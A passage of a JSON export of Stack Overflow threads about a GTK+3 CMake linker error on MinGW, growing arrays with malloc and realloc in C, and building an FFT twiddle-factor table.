"https://www.gravatar.com/avatar/29fb7cebb25d089c88c393d5daaf2323?s=128&d=identicon&r=PG&f=1", "display_name": "Nightloewe", "link": "https://stackoverflow.com/users/7631858/nightloewe"}, "edited": false, "score": 0, "creation_date": 1499188681, "post_id": 44911299, "comment_id": 76799090, "body": "dwmapi.dll is in C:/windows/system32 located in windows 10"}, {"owner": {"reputation": 606, "user_id": 7631858, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/29fb7cebb25d089c88c393d5daaf2323?s=128&d=identicon&r=PG&f=1", "display_name": "Nightloewe", "link": "https://stackoverflow.com/users/7631858/nightloewe"}, "edited": false, "score": 0, "creation_date": 1499189873, "post_id": 44911299, "comment_id": 76799584, "body": "it creates the libdwmapi.a as 0 byte file"}, {"owner": {"reputation": 606, "user_id": 7631858, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/29fb7cebb25d089c88c393d5daaf2323?s=128&d=identicon&r=PG&f=1", "display_name": "Nightloewe", "link": "https://stackoverflow.com/users/7631858/nightloewe"}, "edited": false, "score": 0, "creation_date": 1499189890, "post_id": 44911299, "comment_id": 76799590, "body": "C:\\MinGW\\bin&gt;dlltool -d dwmapi.def -l libdwmapi.a                           dlltool: CreateProcess"}, {"owner": {"reputation": 606, "user_id": 7631858, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/29fb7cebb25d089c88c393d5daaf2323?s=128&d=identicon&r=PG&f=1", "display_name": "Nightloewe", "link": "https://stackoverflow.com/users/7631858/nightloewe"}, "edited": false, "score": 0, "creation_date": 1499201560, "post_id": 44911299, "comment_id": 76804136, "body": "ok, I created a new mingw directory and installed all packages I need and it worked"}], "tags": [], "owner": {"reputation": 6973, "user_id": 720391, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lGHly.png?s=128&g=1", "display_name": "mattn", "link": "https://stackoverflow.com/users/720391/mattn"}, "is_accepted": false, "score": 0, "last_activity_date": 1499189305, "last_edit_date": 1499189305, "creation_date": 1499188555, "answer_id": 44911299, "question_id": 44911016, "link": "https://stackoverflow.com/questions/44911016/error-while-compiling-with-cmake-cannot-find-ldwmapi/44911299#44911299", "title": "Error while compiling with cmake: cannot find -ldwmapi", "body": "<p>dwmapi.dll is provided only for Vista. So I guess that it is a bug of package of gtk+-3.0. And <code>-ldwmapi</code> is not required for your OS. Below is a workaround to fix this issue. I don't make sure this will solve your issue. Note that this is self-responsibility.</p>\n\n<ol>\n<li>make backup-copy of gdk-3.0.pc, gdk-broadway-3.0.pc, gdk-win32-3.0.pc in <code>C:\\msys64\\mingw64\\lib\\pkgconfig</code></li>\n<li>open those files in vim, remove <code>-ldwmapi</code> and <code>:wq</code></li>\n</ol>\n\n<h1>UPDATE</h1>\n\n<p>Let's create libdwmapi.a</p>\n\n<ol>\n<li>download def file from <a href=\"https://raw.githubusercontent.com/Alexpux/mingw-w64/master/mingw-w64-crt/libarm32/dwmapi.def\" rel=\"nofollow noreferrer\">here</a></li>\n<li><code>dlltool -d dwmapi.def -l libdwmapi.a</code></li>\n</ol>\n"}], "owner": {"reputation": 606, "user_id": 7631858, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/29fb7cebb25d089c88c393d5daaf2323?s=128&d=identicon&r=PG&f=1", "display_name": "Nightloewe", "link": "https://stackoverflow.com/users/7631858/nightloewe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 464, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1499189305, "creation_date": 1499187342, "last_edit_date": 1499187660, "question_id": 44911016, "link": "https://stackoverflow.com/questions/44911016/error-while-compiling-with-cmake-cannot-find-ldwmapi", "title": "Error while compiling with cmake: cannot find -ldwmapi", "body": "<p><strong>Edit:</strong> Im using MinGW-x86_64 on windows</p>\n\n<p>When Im trying to compile a gtk+ 3 c project with cmake, I have this error message on the log:</p>\n\n<pre><code>\"C:\\Program Files\\JetBrains\\CLion 2017.1.3\\bin\\cmake\\bin\\cmake.exe\" --build C:\\Users\\Jonas\\ClionProjects\\tutorial\\cmake-build-debug --target tutorial -- -j 4\n[ 50%] Linking C executable tutorial.exe\nc:/mingw/bin/../lib/gcc/mingw32/4.9.3/../../../../mingw32/bin/ld.exe: cannot find -ldwmapi\ncollect2.exe: error: ld returned 1 exit status\nCMakeFiles\\tutorial.dir\\build.make:96: recipe for target 'tutorial.exe' failed\nmingw32-make.exe[3]: *** [tutorial.exe] Error 1\nmingw32-make.exe[2]: *** [CMakeFiles/tutorial.dir/all] Error 2\nCMakeFiles\\Makefile2:66: recipe for target 'CMakeFiles/tutorial.dir/all' failed\nCMakeFiles\\Makefile2:78: recipe for target 'CMakeFiles/tutorial.dir/rule' failed\nmingw32-make.exe[1]: *** [CMakeFiles/tutorial.dir/rule] Error 2\nmingw32-make.exe: *** [tutorial] Error 2\nMakefile:117: recipe for target 'tutorial' failed\n</code></pre>\n\n<p>This is my CMakeLists.txt, in there I added gtk3 and its libraries, but when Im trying to compile, it has the errors mentioned before.</p>\n\n<pre><code>cmake_minimum_required(VERSION 3.7)\nproject(tutorial)\n\nset(CMAKE_C_STANDARD 99)\n\nset(SOURCE_FILES main.c)\n\nset(PKG_CONFIG_EXECUTABLE \"C:/msys64/mingw64/bin/pkg-config.exe\")\n\nFIND_PACKAGE(PkgConfig REQUIRED)\nPKG_CHECK_MODULES(GTK3 REQUIRED gtk+-3.0)\n\nINCLUDE_DIRECTORIES(${GTK3_INCLUDE_DIRS})\nLINK_DIRECTORIES(${GTK3_LIBRARY_DIRS})\n\nadd_executable(tutorial ${SOURCE_FILES})\n\nADD_DEFINITIONS(${GTK3_CFLAGS_OTHER})\n\nTARGET_LINK_LIBRARIES(tutorial ${GTK3_LIBRARIES})\n</code></pre>\n"}, {"tags": ["c", "malloc", "realloc"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 2, "creation_date": 1499186813, "post_id": 44910863, "comment_id": 76798290, "body": "The pointer cast is not needed in C, as <code>void *</code> is implicitly convertible to any other pointer. And <code>void *</code> is what both <a href=\"http://en.cppreference.com/w/c/memory/malloc\" rel=\"nofollow noreferrer\"><code>malloc</code></a> and <a href=\"http://en.cppreference.com/w/c/memory/realloc\" rel=\"nofollow noreferrer\"><code>realloc</code></a> returns."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499187047, "post_id": 44910863, "comment_id": 76798396, "body": "Also, if you follow <a href=\"http://en.cppreference.com/w/c/memory/malloc\" rel=\"nofollow noreferrer\">the <code>realloc</code> reference link</a> you will see that if you pass a null pointer as the first argument then it works as <code>malloc</code>. So in your case it seems the correct solution would be the second function using <code>realloc</code>, even when doing the initial allocation (if <code>total_elements</code> and <code>space_allocated</code> are correctly initialized to zero)."}, {"owner": {"reputation": 21, "user_id": 8032156, "user_type": "registered", "accept_rate": 33, "profile_image": "https://lh6.googleusercontent.com/-e86hiNL4YXc/AAAAAAAAAAI/AAAAAAAAAPI/2zCyxhHCKpY/photo.jpg?sz=128", "display_name": "N Tesfai", "link": "https://stackoverflow.com/users/8032156/n-tesfai"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499187267, "post_id": 44910863, "comment_id": 76798507, "body": "@Someprogrammerdude To your point about    <code>realloc()</code> functioning as    <code>malloc()</code> I did read about that somewhere on here. But what if I felt compelled to use just    <code>malloc()</code>?"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499187321, "post_id": 44910863, "comment_id": 76798538, "body": "Then perhaps create a separate (and simpler) function, like <code>create_array</code> which only allocates and initializes the variables."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1499188715, "post_id": 44910863, "comment_id": 76799103, "body": "The first function contains: <code>collection = malloc(space_allocated * sizeof(struct some_struct));              if(course_collection == NULL){</code> \u2014 don&#39;t you need to check <code>collection</code> rather than <code>course_collection</code>?  It also throws away any previous data stored in <code>collection</code> \u2014 leaking memory."}, {"owner": {"reputation": 21, "user_id": 8032156, "user_type": "registered", "accept_rate": 33, "profile_image": "https://lh6.googleusercontent.com/-e86hiNL4YXc/AAAAAAAAAAI/AAAAAAAAAPI/2zCyxhHCKpY/photo.jpg?sz=128", "display_name": "N Tesfai", "link": "https://stackoverflow.com/users/8032156/n-tesfai"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499189025, "post_id": 44910863, "comment_id": 76799227, "body": "@JonathanLeffler fixed"}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1499189850, "post_id": 44910863, "comment_id": 76799576, "body": "While <code>space_allocated *= 2;</code> is fine, just note that doubling the allocation size can grow rapidly. Depending on your need adding a fixed amount (e.g. <code>space_allocated += CHUNK_SIZE;</code>) may serve your purposes better. It depends on your data. Obviously if you have 501k elements you don&#39;t want to resize to 1M at 500K."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1499190674, "post_id": 44910863, "comment_id": 76799863, "body": "@DavidC.Rankin: Doubling is a very valid mechanism, and if you&#39;ve already got 500 k elements, there&#39;s every chance you might get another 500 k of them unless there is some positive information to the contrary.  If you&#39;ve finished reading and won&#39;t need to grow the array any more, and if there&#39;s more than some threshold of unused space (4 KiB, perhaps; perhaps less than that), then a shrinking <code>realloc()</code> will release the surplus space back to the storage management functions for later reused."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499191771, "post_id": 44910863, "comment_id": 76800280, "body": "@JonathanLeffler I agree, that&#39;s why I included &quot;<code>space_allocated *= 2;</code> is fine&quot;. The note was just there for thought promotion over how one allocation scheme may better fit an anticipated data set than another. Not knocking either way. And you can always call a final <code>realloc</code> to size the allocation to your data after the input is over."}, {"owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1499195777, "post_id": 44910863, "comment_id": 76801940, "body": "@David C. Rankin, Re &quot;<i>Obviously if you have 501k elements you don&#39;t want to resize to 1M at 500K</i>&quot;, No, that&#39;s not obvious. Maybe growing by 100% is excessive, but the idea is sound. Perl arrays grow by 20%, so adding an element to a 500,000-element array extends the buffer to 600,000."}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user8245293"}, "is_accepted": false, "score": 0, "last_activity_date": 1499187400, "creation_date": 1499187400, "answer_id": 44911025, "question_id": 44910863, "link": "https://stackoverflow.com/questions/44910863/why-does-one-method-for-allocating-memory-fail-compared-to-another-that-works/44911025#44911025", "title": "Why does one method for allocating memory fail compared to another that works?", "body": "<p>You should allocate the first initialization with <code>malloc</code>, and resize it with <code>realloc</code>.</p>\n\n<p>When you <code>malloc</code> again in the first way(completely nonsense), the system allocate a NEW memory space and return the address. Now you made one good memory leak.</p>\n\n<p>The second way looks logical, and remember, beside in some compilers, <code>realloc</code> could be used instead of <code>malloc</code>(where reallocating memory is <code>NULL</code>), but you may do the first initialization with <code>malloc</code> and ignore their kindness.</p>\n\n<p>both <code>realloc</code> and <code>malloc</code> return <code>void*</code>, but at the end they all are bytes(<code>char</code>). Since C is well weaked, you may or may not cast the return type to a type(pointer). But in c++, it's diff.</p>\n"}, {"tags": [], "owner": {"reputation": 5867, "user_id": 2252087, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/020cbe41b02f03d59f3adae022c0ce7d?s=128&d=identicon&r=PG", "display_name": "ensc", "link": "https://stackoverflow.com/users/2252087/ensc"}, "is_accepted": false, "score": 0, "last_activity_date": 1499187819, "creation_date": 1499187819, "answer_id": 44911137, "question_id": 44910863, "link": "https://stackoverflow.com/questions/44910863/why-does-one-method-for-allocating-memory-fail-compared-to-another-that-works/44911137#44911137", "title": "Why does one method for allocating memory fail compared to another that works?", "body": "<p>You can use a <code>void *</code> type, but I prefer to use the correct type</p>\n\n<pre><code>struct some_struct *tmp = realloc(collection, num_allocated * sizeof *tmp);\n</code></pre>\n\n<p>The temporary variable is used to avoid memory leaks in the error path:</p>\n\n<pre><code>if (!tmp) {\n    perror(\"realloc()\");\n    free(collection);\n    goto err;\n}\n\ncollection = tmp;\n</code></pre>\n\n<p>You can always use <code>realloc()</code> when <code>collection</code> is initialized as <code>NULL</code>.  But you should verify that <code>num_allocated * sizeof *tmp</code> does not overflow.</p>\n"}], "owner": {"reputation": 21, "user_id": 8032156, "user_type": "registered", "accept_rate": 33, "profile_image": "https://lh6.googleusercontent.com/-e86hiNL4YXc/AAAAAAAAAAI/AAAAAAAAAPI/2zCyxhHCKpY/photo.jpg?sz=128", "display_name": "N Tesfai", "link": "https://stackoverflow.com/users/8032156/n-tesfai"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 57, "favorite_count": 1, "answer_count": 2, "score": -2, "last_activity_date": 1499188992, "creation_date": 1499186649, "last_edit_date": 1499188992, "question_id": 44910863, "link": "https://stackoverflow.com/questions/44910863/why-does-one-method-for-allocating-memory-fail-compared-to-another-that-works", "title": "Why does one method for allocating memory fail compared to another that works?", "body": "<p>If my intention was to create a dynamically sized array of structs. Could someone explain to me how one method that allocates memory to resize the array works the way it should; compared to one that fails after x number of elements are added to the array?</p>\n\n<p>The following method uses <code>malloc()</code> (incorrectly). Could someone explain how to properly allocate memory to the array?</p>\n\n<pre><code>struct some_struct{...data members...}*collection = NULL;\n    int total_elements;\n    int space_allocated; // the number of elements allocated to the array\n\n    void resize_array(){\n        if(total_elements == space_allocated) {\n            if(space_allocated == 0)\n                space_allocated =2;\n            else\n                space_allocated *= 2;\n            //where collection is a pointer to a struct\n            collection = malloc(space_allocated * sizeof(struct some_struct));\n\n            if(collection == NULL){\n                fprintf(stderr,\"NO MEMORY ALLOCATED\");\n                exit(EXIT_FAILURE);\n            }\n        }\n    }\n</code></pre>\n\n<p>Compared to another method that uses <code>realloc()</code> correctly to dynamically allocate memory for the array. What is the significance of a void* type variable used to hold the memory?</p>\n\n<pre><code>    void resize_array(){\n\n        if(total_elements == space_allocated){\n            if(space_allocated == 0)\n                space_allocated = 2;\n            else\n                space_allocated *= 2;\n                //why is a variable of type void allowed? What does that mean?\n                void* tmp = realloc(collection, ((num_allocated)*\n                sizeof(struct some_struct)));\n                if(!_tmp){\n                    fprintf(stderr,\"NO MEMORY ALLOCATED\");\n                    exit(EXIT_FAILURE);\n                }\n                //what is the significance of the pointer cast?\n                collection = (some_struct*) _tmp;\n        }\n    }\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499184962, "post_id": 44910411, "comment_id": 76797502, "body": "What is the expected result? And which one is incorrect?"}, {"owner": {"reputation": 187, "user_id": 8204704, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/dfa102dc7018ec1ccb28ebd5b3e88000?s=128&d=identicon&r=PG&f=1", "display_name": "A.nechi", "link": "https://stackoverflow.com/users/8204704/a-nechi"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1499185030, "post_id": 44910411, "comment_id": 76797526, "body": "Ok just a minute i will make an edit to show you the expected result"}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499185097, "post_id": 44910411, "comment_id": 76797556, "body": "Unrelated to your problem, but why don&#39;t you use <a href=\"http://en.cppreference.com/w/c/numeric/math/cos\" rel=\"nofollow noreferrer\"><code>cosf</code></a> if you want to use <code>float</code>?"}, {"owner": {"reputation": 6013, "user_id": 3310281, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9b8b4ec03e2c7a424fdc428eb55f2e8?s=128&d=identicon&r=PG&f=1", "display_name": "Malcolm McLean", "link": "https://stackoverflow.com/users/3310281/malcolm-mclean"}, "edited": false, "score": 0, "creation_date": 1499185137, "post_id": 44910411, "comment_id": 76797579, "body": "Likely your problem is that FFT interleaving is very involved. I wrote some code to do it for arbitrary window sizes once, but I couldn&#39;t replicate it now without a lot of effort."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1499185300, "post_id": 44910411, "comment_id": 76797645, "body": "As for your problem, you want the 64 first entries to be the same as now? And then should it be four or 256 lines with &quot;2nd set of lines&quot;? And so on for the last &quot;set&quot;? Can you perhaps show us a example of the wanted output for a <i>smaller</i> set of data?"}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1499186105, "post_id": 44910411, "comment_id": 76797971, "body": "4th set: 64 (previous * 4) or 256 (previous * previous) lines?"}, {"owner": {"reputation": 187, "user_id": 8204704, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/dfa102dc7018ec1ccb28ebd5b3e88000?s=128&d=identicon&r=PG&f=1", "display_name": "A.nechi", "link": "https://stackoverflow.com/users/8204704/a-nechi"}, "edited": false, "score": 0, "creation_date": 1499186116, "post_id": 44910411, "comment_id": 76797978, "body": "Please have a look at the edit that I&#39;ve made ...  i hope it&#39;s clearer now"}, {"owner": {"reputation": 187, "user_id": 8204704, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/dfa102dc7018ec1ccb28ebd5b3e88000?s=128&d=identicon&r=PG&f=1", "display_name": "A.nechi", "link": "https://stackoverflow.com/users/8204704/a-nechi"}, "reply_to_user": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1499186193, "post_id": 44910411, "comment_id": 76798020, "body": "@Aconcagua : i don&#39;t need fourth set"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1499189310, "post_id": 44910411, "comment_id": 76799345, "body": "Any reason you don<code>t use </code>_Complex` or at least a <code>struct</code>?"}, {"owner": {"reputation": 187, "user_id": 8204704, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/dfa102dc7018ec1ccb28ebd5b3e88000?s=128&d=identicon&r=PG&f=1", "display_name": "A.nechi", "link": "https://stackoverflow.com/users/8204704/a-nechi"}, "edited": false, "score": 0, "creation_date": 1499189751, "post_id": 44910411, "comment_id": 76799534, "body": "Yes I&#39;m using the split data technique for more flexibility Because I&#39;m trying to enhance time performance of an FFT ... so using a struct will make the access and loads a little bit heavy ...also using the complex type which is a 2 double type digits is impossible due to the limited hardware."}], "answers": [{"tags": [], "owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "is_accepted": true, "score": 1, "last_activity_date": 1499241661, "last_edit_date": 1499241661, "creation_date": 1499185548, "answer_id": 44910596, "question_id": 44910411, "link": "https://stackoverflow.com/questions/44910411/create-a-twiddle-table-with-a-specific-order/44910596#44910596", "title": "Create a twiddle table with a specific order?", "body": "<p>You might maintain factor and set size in an additional (outer) loop:</p>\n\n<pre><code>// you will need more than you calculated previously!\nfloat twiddle_real[TWIDDLE_LIMIT * 3];\nfloat twiddle_imag[TWIDDLE_LIMIT * 3];\n\n// pointer arithmetic...\nfloat* real = twiddle_real;\nfloat* imag = twiddle_imag;\n\ndouble factor = 1.0;\nfor(int size = TWIDDLE_LIMIT; size &gt; 1; size /= 4)\n{\n    for(int j = 0; j &lt; 64; ++j)\n    {\n        *real++ = (float)  cos((j % size) * factor * 2.0 * PI / N);\n        *imag++ = (float) -sin((j % size) * factor * 2.0 * PI / N);\n    }\n    factor *= 4.0;\n}\n</code></pre>\n\n<p>You do not need all those casts by the way - since factor is a double, <code>(j % size)</code> is converted to implicitly, as well as <code>N</code> afterwards.</p>\n\n<p>Recommendation: As re and img belong together, I would represent them as such:</p>\n\n<pre><code>struct Complex\n{\n    double re;\n    double im;\n};\n</code></pre>\n\n<p>You could then have an array of these:</p>\n\n<pre><code>struct Complex twiddle[TW_size]; // no need for malloc, by the way...\n</code></pre>\n\n<p>You might have noticed: I changed to double, too. There is no reason to use float (with more limited precision) unless you have limited memory available (micro controllers)...</p>\n\n<p>Alternative (why re-inventing the wheel?): use <a href=\"https://stackoverflow.com/questions/6418807/how-to-work-with-complex-numbers-in-c\"><code>complex.h</code></a>.</p>\n"}, {"tags": [], "owner": {"reputation": 42504, "user_id": 1161878, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/0157ddd785dc01e95342e3661d34b42a?s=128&d=identicon&r=PG", "display_name": "Gene", "link": "https://stackoverflow.com/users/1161878/gene"}, "is_accepted": false, "score": 0, "last_activity_date": 1499193084, "last_edit_date": 1499193084, "creation_date": 1499192747, "answer_id": 44912193, "question_id": 44910411, "link": "https://stackoverflow.com/questions/44910411/create-a-twiddle-table-with-a-specific-order/44912193#44912193", "title": "Create a twiddle table with a specific order?", "body": "<p>It doesn't work because your math is wrong.  The first table covers only the first quadrant of the complex plane. When you multiply by 4 for the second segment of your desired output, you won't get 4 repeats of the first quadrant, you'll get all four quadrants.</p>\n\n<p>Here is something closer to what you specified. And it fixes some problems with your use of C:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;math.h&gt;\n\n#define N_ROOTS_OF_UNITY 64\n#define PI 3.14159265358979323846264338327950\n\nfloat *twiddle_real;\nfloat *twiddle_imag;\n\nint main()\n{\n  size_t table_size = N_ROOTS_OF_UNITY * 3;\n\n  twiddle_real  = malloc(table_size * sizeof(float));\n  twiddle_imag  = malloc(table_size * sizeof(float));\n\n  size_t i, incr, repeat, k = 0;\n  for (incr = 1; incr &lt;= 16; incr *= 4) {\n    for (repeat = 0; repeat &lt; incr; ++repeat) {\n      for(i = 0; i &lt; N_ROOTS_OF_UNITY; i += incr) {\n        twiddle_real[k] = (float) cos(i * (PI / 2) / N_ROOTS_OF_UNITY);\n        twiddle_imag[k] = (float) -sin(i * (PI / 2) / N_ROOTS_OF_UNITY);\n        ++k;\n      }\n    }\n  }\n  for (int a = 0; a &lt; table_size; a++)\n    printf(\"%d: RE = %f\\tIM = %f\\n\", a, twiddle_real[a], twiddle_imag[a]);\n  return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 187, "user_id": 8204704, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/dfa102dc7018ec1ccb28ebd5b3e88000?s=128&d=identicon&r=PG&f=1", "display_name": "A.nechi", "link": "https://stackoverflow.com/users/8204704/a-nechi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 0, "closed_date": 1499206546, "accepted_answer_id": 44910596, "answer_count": 2, "score": 0, "last_activity_date": 1499241661, "creation_date": 1499184715, "last_edit_date": 1499188239, "question_id": 44910411, "link": "https://stackoverflow.com/questions/44910411/create-a-twiddle-table-with-a-specific-order", "closed_reason": "Not suitable for this site", "title": "Create a twiddle table with a specific order?", "body": "<p>I was hoping to create a twiddle table with a specific ordering for a specific purpose, here is the initial code:</p>\n\n<pre><code>#define TWIDDLE_LIMIT 64\n#define PI 3.1415927\n\nfloat *twiddle_real;\nfloat *twiddle_imag;\n\nvoid main()\n{\n  int N = 256;\n  int TW_size = TWIDDLE_LIMIT + (TWIDDLE_LIMIT&gt;&gt;2);\n\n  twiddle_real  = malloc(TW_size * sizeof(float));\n  twiddle_imag  = malloc(TW_size * sizeof(float));\n\n  int i;\n  for(i=0; i&lt;TWIDDLE_LIMIT; i++)\n  {\n    twiddle_real[i] = (float)   cos((float)i * 2.0 * PI / (float)N);\n    twiddle_imag[i] = (float) - sin((float)i * 2.0 * PI / (float)N);\n  }\n  for(int a=0; a&lt;TWIDDLE_LIMIT; a++)\n    printf(\"RE = %f \\t IM = %f \\n\",twiddle_real[a],twiddle_imag[a]);\n}\n</code></pre>\n\n<p>And i get this kind of result:</p>\n\n<pre><code>RE = 1.000000    IM = -0.000000 //64 lines\nRE = 0.999699    IM = -0.024541 \nRE = 0.998795    IM = -0.049068 \nRE = 0.997290    IM = -0.073565 \nRE = 0.995185    IM = -0.098017 \nRE = 0.992480    IM = -0.122411 \nRE = 0.989177    IM = -0.146730 \nRE = 0.985278    IM = -0.170962 \nRE = 0.980785    IM = -0.195090 \nRE = 0.975702    IM = -0.219101 \nRE = 0.970031    IM = -0.242980 \nRE = 0.963776    IM = -0.266713 \nRE = 0.956940    IM = -0.290285 \nRE = 0.949528    IM = -0.313682 \nRE = 0.941544    IM = -0.336890 \nRE = 0.932993    IM = -0.359895 \nRE = 0.923880    IM = -0.382683 \nRE = 0.914210    IM = -0.405241 \nRE = 0.903989    IM = -0.427555 \nRE = 0.893224    IM = -0.449611 \nRE = 0.881921    IM = -0.471397 \nRE = 0.870087    IM = -0.492898 \nRE = 0.857729    IM = -0.514103 \nRE = 0.844854    IM = -0.534998 \nRE = 0.831470    IM = -0.555570 \nRE = 0.817585    IM = -0.575808 \nRE = 0.803208    IM = -0.595699 \nRE = 0.788346    IM = -0.615232 \nRE = 0.773010    IM = -0.634393 \nRE = 0.757209    IM = -0.653173 \nRE = 0.740951    IM = -0.671559 \nRE = 0.724247    IM = -0.689541 \nRE = 0.707107    IM = -0.707107 \nRE = 